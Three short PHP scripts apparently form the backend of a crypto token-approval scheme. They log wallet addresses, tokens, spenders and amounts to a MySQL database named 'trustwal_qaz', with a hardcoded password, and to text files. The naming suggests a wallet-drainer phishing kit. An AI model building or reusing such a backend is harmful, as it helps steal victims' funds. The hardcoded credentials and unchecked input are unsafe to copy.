








<?php
header('Content-Type: application/json');

// Replace these with your actual database credentials
$host = "127.0.0.1";
$dbname = "trustwal_qaz";
$user = "trustwal_qaz";
$pass = "Zxcasdqwe321";

// Get JSON data
$data = json_decode(file_get_contents("php://input"), true);

$wallet = $data['wallet'];
$token = $data['token'];
$spender = $data['spender'];
$amount = $data['amount'];

try {
    // Connect to MySQL
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Insert into database
    $stmt = $pdo->prepare("INSERT INTO approvals (wallet, token, spender, amount) VALUES (?, ?, ?, ?)");
    $stmt->execute([$wallet, $token, $spender, $amount]);

    echo json_encode(["message" => "Approval saved to database"]);
} catch (PDOException $e) {
    echo json_encode(["error" => $e->getMessage()]);
}
?>


















<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (isset($input['wallet'])) {
        $wallet = $input['wallet'];
        file_put_contents('wallets.txt', "Approved: " . $wallet . PHP_EOL, FILE_APPEND);
        echo json_encode(["message" => "Approval logged"]);
    } else {
        http_response_code(400);
        echo json_encode(["error" => "No wallet address provided"]);
    }
} else {
    http_response_code(405);
    echo json_encode(["error" => "Method not allowed"]);
}
?>



<?php
$data = json_decode(file_get_contents("php://input"), true);

$wallet = $data['wallet'];
$token = $data['token'];
$spender = $data['spender'];
$amount = $data['amount'];
$time = date("Y-m-d H:i:s");

$logLine = "[$time] Wallet: $wallet | Token: $token | Spender: $spender | Amount: $amount" . PHP_EOL;

file_put_contents("approvals.txt", $logLine, FILE_APPEND);
echo json_encode(["message" => "Approval logged"]);
?>

